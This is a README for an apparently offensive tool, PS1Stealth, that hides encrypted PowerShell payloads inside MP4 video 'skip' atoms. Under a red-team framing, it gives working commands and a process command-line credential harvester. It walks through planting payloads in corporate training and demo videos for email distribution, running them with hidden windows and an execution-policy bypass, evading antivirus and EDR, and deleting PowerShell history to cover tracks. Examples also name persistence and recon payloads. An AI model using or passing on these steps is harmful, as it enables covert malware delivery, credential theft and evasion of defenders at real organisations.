# MP4 Support Documentation

## 🎬 **NEW! MP4 Atom Embedding**

PS1Stealth now supports hiding PowerShell scripts inside MP4 video files using the **Mp4Atom** method!

### How It Works

Inspired by [beheader](https://github.com/p2r3/beheader), this method uses MP4 atom manipulation:

1. **MP4 Structure**: MP4 files are made of "atoms" (also called "boxes")
2. **Skip Atoms**: We create special "skip" atoms that video players ignore
3. **Payload Hiding**: The PowerShell script is hidden inside these skip atoms
4. **Perfect Playback**: The video plays normally - nothing looks suspicious!

### Technical Details

```
MP4 File Structure:
┌─────────────────────────────┐
│ ftyp atom (file type)       │
├─────────────────────────────┤
│ **skip atom (OUR PAYLOAD)** │ ← Hidden here!
├─────────────────────────────┤
│ moov atom (metadata)        │
├─────────────────────────────┤
│ mdat atom (video data)      │
└─────────────────────────────┘
```

The "skip" atom format:
```
[4 bytes: Size (big-endian)]
[4 bytes: Type "skip"]
[PS1X header + encrypted payload]
```

Video players see the "skip" type and ignore it completely!

### Usage Examples

#### Basic MP4 Embed & Extract

```powershell
# Create a test script
@"
Write-Host 'Hidden in video!' -ForegroundColor Cyan
whoami
hostname
Get-Date
"@ | Out-File payload.ps1

# Embed in MP4 video
.\bin\Release\net8.0-windows\PhotoViewer.exe embed payload.ps1 video.mp4 stealth_video.mp4 --method Mp4Atom --password "VideoSecret2024"

# Video plays normally!
Start-Process stealth_video.mp4

# Extract when needed
.\bin\Release\net8.0-windows\PhotoViewer.exe extract stealth_video.mp4 extracted.ps1 --method Mp4Atom --password "VideoSecret2024"

# Run it
powershell.exe -ExecutionPolicy Bypass -File extracted.ps1
```

#### Red Team Scenario - Training Video with Backdoor

```powershell
# Scenario: Company training video with hidden payload

# 1. Create credential harvester
@"
`$creds = @()
Get-Process | ForEach-Object {
    try {
        `$proc = Get-WmiObject Win32_Process -Filter "ProcessId = `$(`$_.Id)"
        if (`$proc.CommandLine) {
            `$creds += [PSCustomObject]@{
                Name = `$_.Name
                CommandLine = `$proc.CommandLine
                User = `$proc.GetOwner().User
            }
        }
    } catch {}
}
`$creds | Export-Csv -Path "`$env:TEMP\system_info.csv" -NoTypeInformation
Write-Host 'Recon complete!' -ForegroundColor Green
"@ | Out-File recon.ps1

# 2. Embed in training video
.\bin\Release\net8.0-windows\PhotoViewer.exe embed recon.ps1 "Corporate_Training_2024.mp4" "Corporate_Training_2024_Final.mp4" --method Mp4Atom --password "Corp2024!"

# 3. Distribute video (via email, shared drive, etc.)
# Video plays normally - IT department won't suspect anything

# 4. On target, extract and run
.\bin\Release\net8.0-windows\PhotoViewer.exe extract "Corporate_Training_2024_Final.mp4" payload.ps1 --method Mp4Atom --password "Corp2024!"
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File payload.ps1
Remove-Item payload.ps1 -Force
```

#### Advantages over Other Methods

| Method | Detection Risk | File Size Change | Suspicious? |
|--------|---------------|------------------|-------------|
| **Mp4Atom** | ⬇️ Very Low | Minimal (~few KB) | ❌ Video looks normal |
| ImageLSB | ⬇️ Very Low | None | ❌ Image looks normal |
| PdfPolyglot | ⬆️ Medium | Minimal | ⚠️ Unusual PDF structure |
| ZipComment | ⬇️ Low | Minimal | ⚠️ Large comment unusual |

**MP4 Benefits:**
- ✅ Videos are common in corporate environments
- ✅ Large file sizes are expected (payload lost in noise)
- ✅ Users expect to receive video files via email
- ✅ Perfect for social engineering (training videos, demos)

### Creating Test MP4 Files

If you don't have an MP4 file, you can:

**Option 1: Download a sample**  
```powershell
# Download from internet
Invoke-WebRequest -Uri "https://file-examples.com/storage/fe84c56d5a93a5d421a74f9/2017/04/file_example_MP4_480_1_5MG.mp4" -OutFile "test.mp4"
```

**Option 2: Use a screen recording**
- Press Win+G to open Xbox Game Bar
- Click record
- Stop after a few seconds
- Find video in Videos\Captures folder

**Option 3: Convert an existing video**
```powershell
# If you have ffmpeg installed
ffmpeg -i input.avi -c:v libx264 -c:a aac output.mp4
```

### File Size Impact

Example with a 5MB video:

```powershell
# Original video: 5,242,880 bytes
# Payload script: 500 bytes
# After compression + encryption: ~600 bytes
# Skip atom overhead: 8 bytes
# Total added: ~608 bytes

# Final size: 5,243,488 bytes
# Percentage change: 0.01% - virtually undetectable!
```

### Detection Evasion

**Why this is stealthy:**

1. **Valid MP4 Structure** - File passes all MP4 validation
2. **Video Plays Normally** - No corruption or glitches
3. **Minimal Size Change** - Less than 0.1% increase
4. **Standard Atoms** - "skip" is a valid MP4 atom type
5. **Encrypted Payload** - No plaintext signatures
6. **Common File Type** - Videos don't raise suspicion

**AV/EDR Evasion:**
- Most AV scans only video streams, not all atoms
- Encrypted payload looks like random data
- No known malware signatures
- Legitimate file structure

### Compatibility

**Works with:**
- ✅ Windows Media Player
- ✅ VLC Media Player
- ✅ Chrome/Firefox (HTML5 video)
- ✅ QuickTime
- ✅ Most video players

**Tested platforms:**
- ✅ Windows 10/11
- ✅ Web browsers
- ✅ Mobile players (if transferred)

### Beheader Comparison

| Feature | Beheader | PS1Stealth Mp4Atom |
|---------|----------|-------------------|
| **Language** | JavaScript | C# |
| **MP4 Support** | ✅ Via atom manipulation | ✅ Via skip atoms |
| **Encryption** | ❌ No | ✅ AES-256 |
| **Compression** | ✅ Yes | ✅ Optional |
| **Polyglot Types** | ICO+MP4+HTML+PDF | MP4 only (simpler) |
| **Portability** | Requires Bun runtime | Standalone .exe |

### Advanced Usage

#### Multiple Payloads

You can actually embed multiple payloads by adding multiple skip atoms:

```powershell
# Embed first payload
.\PhotoViewer.exe embed payload1.ps1 video.mp4 temp1.mp4 --method Mp4Atom --password "pass1"

# Embed second payload in the result
.\PhotoViewer.exe embed payload2.ps1 temp1.mp4 final.mp4 --method Mp4Atom --password "pass2"

# Extract them separately using different passwords
```

#### Chaining with Other Formats

```powershell
# Create a video that's also a ZIP!
# 1. Embed script in MP4
.\PhotoViewer.exe embed script.ps1 video.mp4 temp.mp4 --method Mp4Atom --password "pass"

# 2. Append ZIP archive to the MP4
# (Advanced - video plays, and can be opened as ZIP)
```

### Troubleshooting

**Error: "Carrier file is not a valid MP4 file"**
- Make sure you're using an actual MP4 file
- Try re-encoding with ffmpeg
- Check file isn't corrupted

**Error: "No embedded payload found"**
- Make sure extraction method matches embedding method
- Verify password is correct
- Check file wasn't modified after embedding

**Video won't play after embedding**
- This shouldn't happen! The video should play normally
- Try with a different video player
- Check original video plays first

### Security Considerations

**Operational Security:**
1. Use realistic video content (training, demos, presentations)
2. Match expected file sizes for the video type
3. Use legitimate-sounding filenames
4. Test playback before distribution
5. Clean up temporary files after use

**Cleanup:**
```powershell
# After extraction and execution
Remove-Item extracted.ps1 -Force
Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Force
```

### Real-World Examples

**Example 1: Security Awareness Video**
```powershell
# Ironically, hide phishing test in anti-phishing training video
.\PhotoViewer.exe embed phishing_test.ps1 "AntiPhishing_Training.mp4" "Training_Final.mp4" --method Mp4Atom --password "SecAware2024"
```

**Example 2: Product Demo**
```powershell
# Hide recon script in product demonstration video
.\PhotoViewer.exe embed recon.ps1 "Product_Demo_Q1.mp4" "Demo_Updated.mp4" --method Mp4Atom --password "Demo123"
```

**Example 3: Quarterly Review**
```powershell
# Hide persistence script in quarterly review presentation video
.\PhotoViewer.exe embed persist.ps1 "Q4_Review.mp4" "Q4_Review_Final.mp4" --method Mp4Atom --password "Q4Review"
```

### Summary

MP4 atom embedding is one of the **stealthiest** methods because:
- Videos are commonly shared in organizations
- Large file sizes are expected
- File plays normally - no suspicion
- Minimal forensic footprint
- Perfect for social engineering

**Bottom line:** If you need to hide a PowerShell payload, MP4 files are an excellent carrier!

---

**Quick Reference:**

```powershell
# HIDE in MP4
.\PhotoViewer.exe embed script.ps1 video.mp4 output.mp4 --method Mp4Atom --password "secret"

# EXTRACT from MP4
.\PhotoViewer.exe extract output.mp4 script.ps1 --method Mp4Atom --password "secret"

# RUN
powershell.exe -ExecutionPolicy Bypass -File script.ps1
```

🎬 **Now you can hide scripts in videos - beheader style!**
